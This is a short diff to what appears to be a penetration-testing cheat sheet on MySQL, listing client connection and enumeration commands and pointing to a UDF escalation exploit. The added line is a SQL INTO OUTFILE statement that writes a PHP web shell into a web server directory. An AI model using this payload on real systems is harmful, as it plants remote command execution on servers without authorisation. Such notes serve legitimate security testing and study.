@@ -219,6 +219,7 @@ SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
 mysql -u [USERNAME] -h [IP_ADDR] -p   # Connect to mysql server
 mysql -u [USERNAME] -h [IP_ADDR] -p -e 'SHOW DATABASES;'
 mysql -u [USERNAME] -h [IP_ADDR] -p -e 'USE [DATABASE]; SHOW TABLES;'
+select “<?php echo shell_exec($_GET['cmd']);?>” into outfile’C:/xampp/htdocs/webshell.php’;
 -------------- UDF ----------------
 Requirement (root mysql credential, MySQL 4.1.10a and MySQL 4.0.24)
 https://www.exploit-db.com/exploits/1518
